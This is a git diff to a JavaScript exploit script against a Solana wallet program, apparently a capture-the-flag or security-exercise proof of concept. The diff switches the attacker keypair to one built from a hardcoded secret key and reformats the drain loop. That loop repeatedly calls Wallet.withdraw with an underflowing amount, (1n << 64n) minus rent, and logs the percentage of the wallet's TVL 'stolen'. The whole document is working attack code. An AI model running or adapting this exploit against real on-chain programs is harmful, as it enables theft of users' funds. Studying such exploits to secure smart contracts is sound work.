@@ -32,8 +32,7 @@ let attackerSecretKey = Uint8Array.from([
   163, 191, 97, 101, 129, 245, 158, 22, 200, 191, 11, 23, 166, 6, 179, 225, 153,
   169, 233, 223, 178, 24, 145, 185, 167, 217, 137, 141, 54,
 ]);
-//let attacker = Keypair.fromSecretKey(attackerSecretKey);
-let attacker = Keypair.generate();
+let attacker = Keypair.fromSecretKey(attackerSecretKey);
 
 (async () => {
   // receive 'tiny' airdrop
@@ -63,7 +62,9 @@ let attacker = Keypair.generate();
     );
     let tx1 = new Transaction().add(ix1);
     await sendAndConfirmTransaction(connection, tx1, [attacker]);
-    console.log(`[+] Created a new wallet whose authority is attacker: ${attackerWalletAddress}`);
+    console.log(
+      `[+] Created a new wallet whose authority is attacker: ${attackerWalletAddress}`
+    );
 
     const withdrawAmount = await connection.getBalance(walletAddress);
     console.log(
@@ -74,10 +75,21 @@ let attacker = Keypair.generate();
     const walletRent = await connection.getMinimumBalanceForRentExemption(32);
     for (var i = 0; i < withdrawAmount / walletRent; i++) {
       let amtArg = (1n << 64n) - BigInt(walletRent);
-      const ix3 = Wallet.withdraw(walletProgramId, attackerWalletAddress, attacker.publicKey, walletAddress, amtArg);
+      const ix3 = Wallet.withdraw(
+        walletProgramId,
+        attackerWalletAddress,
+        attacker.publicKey,
+        walletAddress,
+        amtArg
+      );
       let tx3 = new Transaction().add(ix3);
       await sendAndConfirmTransaction(connection, tx3, [attacker]);
-      console.log(`[+] Attacker stole ${(walletRent * i / withdrawAmount * 100).toFixed(3)}% of wallet TVL`)
+      console.log(
+        `[+] Attacker stole ${(
+          ((walletRent * i) / withdrawAmount) *
+          100
+        ).toFixed(3)}% of wallet TVL`
+      );
     }
   }
 
